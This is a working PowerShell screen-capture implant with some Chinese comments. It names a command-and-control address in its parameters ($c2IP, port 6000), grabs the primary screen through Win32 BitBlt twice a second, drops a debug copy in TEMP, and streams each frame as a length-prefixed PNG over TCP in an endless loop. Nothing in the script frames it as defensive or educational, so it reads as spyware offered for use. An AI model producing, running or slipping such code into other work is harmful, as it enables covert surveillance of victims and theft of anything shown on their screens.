param(
    [string]$c2IP = "192.168.174.129",
    [int]$port = 6000
)

if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);
    [DllImport("user32.dll")] public static extern void ReleaseDC(IntPtr hWnd, IntPtr hDC);
}
"@ -IgnoreWarnings
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

try {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $width = $screen.Width
    $height = $screen.Height
    $bmp = New-Object System.Drawing.Bitmap($width, $height)
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    $client = New-Object System.Net.Sockets.TcpClient($c2IP, $port)
    $stream = $client.GetStream()

    while($true) {
        try {
            # 屏幕捕获
            $hDesk = [Win32]::GetDesktopWindow()
            $hDC = [Win32]::GetWindowDC($hDesk)
            $hDest = $graphics.GetHdc()
            [void][Win32]::BitBlt($hDest, 0, 0, $width, $height, $hDC, 0, 0, 0x00CC0020)
            $graphics.ReleaseHdc($hDest)
            [Win32]::ReleaseDC($hDesk, $hDC)

            # 保存调试截图
            $debugPath = "$env:TEMP\client_debug.jpg"
            $bmp.Save($debugPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

            # 转换传输格式
            $ms = New-Object System.IO.MemoryStream
            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png) # 改用 PNG 格式
            $data = $ms.ToArray()
            $ms.Dispose()

            # 发送数据
            $header = [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder($data.Length))
            $stream.Write($header, 0, 4)
            $stream.Write($data, 0, $data.Length)
            $stream.Flush()

            Start-Sleep -Milliseconds 500
        }
        catch {
            Write-Warning "Error in loop: $_"
            Start-Sleep -Seconds 2
        }
    }
}
finally {
    if ($graphics) { $graphics.Dispose() }
    if ($bmp) { $bmp.Dispose() }
    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
}